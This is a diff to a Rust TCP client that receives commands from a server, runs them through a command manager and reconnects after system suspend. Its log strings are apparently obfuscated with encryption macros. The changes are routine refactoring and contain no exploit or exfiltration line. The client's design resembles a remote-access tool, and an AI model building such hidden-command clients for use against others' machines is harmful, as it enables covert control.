@@ -2,7 +2,7 @@ use core::fmt;
 use std::{
     io::{Read, Write},
     net::TcpStream,
-    sync::{Arc, Mutex},
+    sync::Arc,
     thread, time,
     time::{Duration, SystemTime},
 };
@@ -16,6 +16,8 @@ use wpkg_crypto::decode;
 use crate::{
     commands::CommandsManager, crypto, error_crypt, globals, info_crypt, unwrap::CustomUnwrap,
 };
+
+pub const MAX_PACKET_LEN: usize = 65536;
 
 lazy_static! {
     pub static ref COMMANDS: CommandsManager = CommandsManager::new();
@@ -43,8 +45,9 @@ pub async fn connect(addr: &str) {
     }
 }
 
+#[derive(Clone)]
 pub struct Client {
-    pub stream: TcpStream,
+    pub stream: Arc<TcpStream>,
     pub connected: bool,
     pub reconnecting: bool,
 }
@@ -55,7 +58,7 @@ impl Client {
         let stream = TcpStream::connect(address)?;
 
         Ok(Self {
-            stream,
+            stream: Arc::new(stream),
             connected: true,
             reconnecting: false,
         })
@@ -63,10 +66,10 @@ impl Client {
 
     pub fn receive(&mut self) -> Result<String> {
         // allocate an empty buffer
-        let mut data = [0; 65536];
+        let mut data = [0; MAX_PACKET_LEN];
 
         // read buffer
-        let len = self.stream.read(&mut data)?;
+        let len = self.stream.as_ref().read(&mut data)?;
 
         if len == 0 {
             return Err(anyhow!(crypto!("Connecting closed")));
@@ -110,7 +113,9 @@ impl Client {
         info!("{}: {}", crypto!("[Sended]"), message);
 
         // send message to the server
-        self.stream.write_all(message.to_string().as_bytes())?;
+        self.stream
+            .as_ref()
+            .write_all(message.to_string().as_bytes())?;
 
         Ok(())
     }
@@ -127,16 +132,15 @@ impl Client {
         self.receive()
     }
 
-    // detecting computer suspend and reconnecting
+    // Detecting computer suspend and reconnecting
     fn suspend_handler(&mut self) -> anyhow::Result<()> {
-        let arc_connected = Arc::new(Mutex::new(self.connected));
-        let tcp_stream = self.stream.try_clone()?;
+        let stream = self.stream.clone();
 
         thread::spawn(move || {
             info_crypt!("Starting suspend detecting system...");
 
-            while *Arc::clone(&arc_connected).lock().unwrap() {
-                let time: u64 = 1;
+            loop {
+                let time = 1;
 
                 let before = SystemTime::now();
                 thread::sleep(Duration::from_secs(time));
@@ -144,8 +148,8 @@ impl Client {
 
                 if now.as_secs() > time {
                     info_crypt!("Suspend detected... Reconnecting...");
-                    tcp_stream.shutdown(std::net::Shutdown::Both).unwrap_log();
-                    return;
+                    stream.shutdown(std::net::Shutdown::Both).unwrap_log();
+                    break;
                 }
             }
         });
@@ -217,7 +221,7 @@ impl Client {
                     .commands
                     .iter()
                     .enumerate()
-                    .find(|&(_i, command)| decode(command.name()) == cmd);
+                    .find(|&(_i, command)| decode(&command.name()) == cmd);
 
                 if let Some((_i, cmd)) = command {
                     if args.len() < cmd.min_args() {
